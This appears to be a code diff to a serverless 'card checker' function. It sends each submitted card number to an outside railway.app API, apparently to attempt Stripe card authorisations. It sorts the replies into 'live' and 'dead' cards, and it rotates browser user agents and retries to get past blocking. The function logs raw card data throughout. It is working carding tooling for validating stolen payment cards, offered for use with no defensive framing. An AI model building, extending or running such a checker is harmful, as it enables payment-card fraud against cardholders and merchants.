@@ -15,8 +15,6 @@ const userAgents = [
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
 ];
 
 // Get random user agent
@@ -24,22 +22,32 @@ const getRandomUserAgent = (): string => {
   return userAgents[Math.floor(Math.random() * userAgents.length)];
 };
 
-// Check if response should be classified as unknown
-const isUnknownResponse = (data: Record<string, unknown>): boolean => {
+// Determine status from API response
+const getStatusFromResponse = (data: Record<string, unknown>): "live" | "dead" | "unknown" => {
   const message = (data?.message as string)?.toLowerCase() || '';
+  const status = (data?.status as string)?.toUpperCase() || '';
   
   // LIVE responses
   if (message.includes("payment method added successfully") || message.includes("card added successfully")) {
-    return false;
+    return "live";
+  }
+  if (status === 'APPROVED' || status === 'SUCCESS' || status === 'LIVE') {
+    return "live";
   }
   
   // DEAD responses
   if (message.includes("declined") || message.includes("insufficient funds") || message.includes("card was declined")) {
-    return false;
+    return "dead";
+  }
+  if (message.includes("invalid") || message.includes("expired") || message.includes("do not honor")) {
+    return "dead";
+  }
+  if (status === 'DECLINED' || status === 'DEAD' || status === 'FAILED') {
+    return "dead";
   }
   
   // Everything else is UNKNOWN
-  return true;
+  return "unknown";
 };
 
 // Perform API check with retry logic for UNKNOWN responses
@@ -47,44 +55,69 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
   const maxRetries = 3;
   const apiUrl = `http://web-production-a3b94.up.railway.app/api?cc=${cc}`;
   
-  console.log(`Attempt ${attempt}/${maxRetries} - Calling API:`, apiUrl);
+  console.log(`[STRIPE-AUTH] Attempt ${attempt}/${maxRetries} - Calling API:`, apiUrl);
 
-  const response = await fetch(apiUrl, {
-    method: 'GET',
-    headers: {
-      'User-Agent': userAgent,
-      'Accept': 'application/json, text/plain, */*',
-      'Accept-Language': 'en-US,en;q=0.9',
-      'Cache-Control': 'no-cache',
-      'Pragma': 'no-cache',
-    }
-  });
-  
-  const rawText = await response.text();
-  console.log(`Attempt ${attempt} - Raw API response:`, rawText);
-
-  let data: Record<string, unknown>;
   try {
-    data = JSON.parse(rawText);
-  } catch {
-    data = { raw: rawText, status: "ERROR" };
+    const response = await fetch(apiUrl, {
+      method: 'GET',
+      headers: {
+        'User-Agent': userAgent,
+        'Accept': 'application/json, text/plain, */*',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Cache-Control': 'no-cache',
+        'Pragma': 'no-cache',
+      }
+    });
+    
+    const rawText = await response.text();
+    console.log(`[STRIPE-AUTH] Attempt ${attempt} - Raw API response:`, rawText);
+
+    let data: Record<string, unknown>;
+    try {
+      data = JSON.parse(rawText);
+    } catch {
+      data = { raw: rawText, status: "ERROR", message: "Failed to parse response" };
+    }
+
+    console.log(`[STRIPE-AUTH] Attempt ${attempt} - Parsed response:`, data);
+
+    // Add our computed status for frontend
+    const computedStatus = getStatusFromResponse(data);
+    data.computedStatus = computedStatus;
+    
+    // Normalize API response fields
+    data.apiStatus = data.status || 'UNKNOWN';
+    data.apiMessage = data.message || (data.raw as string) || 'No response message';
+
+    // Check if response is UNKNOWN and should retry
+    if (computedStatus === "unknown" && attempt < maxRetries) {
+      console.log(`[STRIPE-AUTH] UNKNOWN response on attempt ${attempt}, retrying with new user agent...`);
+      // Wait before retry (increasing delay)
+      await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
+      // Use a different user agent for retry
+      const newUserAgent = getRandomUserAgent();
+      return performCheck(cc, newUserAgent, attempt + 1);
+    }
+
+    return data;
+  } catch (error) {
+    console.error(`[STRIPE-AUTH] Attempt ${attempt} - Fetch error:`, error);
+    
+    if (attempt < maxRetries) {
+      console.log(`[STRIPE-AUTH] Retrying after fetch error...`);
+      await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
+      const newUserAgent = getRandomUserAgent();
+      return performCheck(cc, newUserAgent, attempt + 1);
+    }
+    
+    return { 
+      status: "ERROR", 
+      message: error instanceof Error ? error.message : "Unknown fetch error",
+      apiStatus: "ERROR",
+      apiMessage: error instanceof Error ? error.message : "Unknown fetch error",
+      computedStatus: "unknown"
+    };
   }
-
-  console.log(`Attempt ${attempt} - Parsed response:`, data);
-
-  // Check if response is UNKNOWN
-  const isUnknown = isUnknownResponse(data);
-  
-  if (isUnknown && attempt < maxRetries) {
-    console.log(`UNKNOWN response on attempt ${attempt}, retrying with new user agent...`);
-    // Wait before retry (increasing delay)
-    await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
-    // Use a different user agent for retry
-    const newUserAgent = getRandomUserAgent();
-    return performCheck(cc, newUserAgent, attempt + 1);
-  }
-
-  return data;
 };
 
 serve(async (req) => {
@@ -98,14 +131,19 @@ serve(async (req) => {
     
     if (!cc) {
       return new Response(
-        JSON.stringify({ error: 'Card data (cc) is required' }),
+        JSON.stringify({ 
+          error: 'Card data (cc) is required', 
+          computedStatus: 'unknown',
+          apiStatus: 'ERROR',
+          apiMessage: 'Card data (cc) is required'
+        }),
         { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
       );
     }
 
     const userAgent = getRandomUserAgent();
-    console.log('Checking card:', cc);
-    console.log('Using User-Agent:', userAgent);
+    console.log('[STRIPE-AUTH] Checking card:', cc);
+    console.log('[STRIPE-AUTH] Using User-Agent:', userAgent);
 
     // Perform check with automatic retry for UNKNOWN responses
     const data = await performCheck(cc, userAgent);
@@ -117,10 +155,16 @@ serve(async (req) => {
 
   } catch (error: unknown) {
     const errorMessage = error instanceof Error ? error.message : 'Unknown error';
-    console.error('Error:', errorMessage);
+    console.error('[STRIPE-AUTH] Error:', errorMessage);
     
     return new Response(
-      JSON.stringify({ error: errorMessage, status: "ERROR" }),
+      JSON.stringify({ 
+        error: errorMessage, 
+        status: "ERROR",
+        computedStatus: "unknown",
+        apiStatus: "ERROR",
+        apiMessage: errorMessage
+      }),
       { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
     );
   }
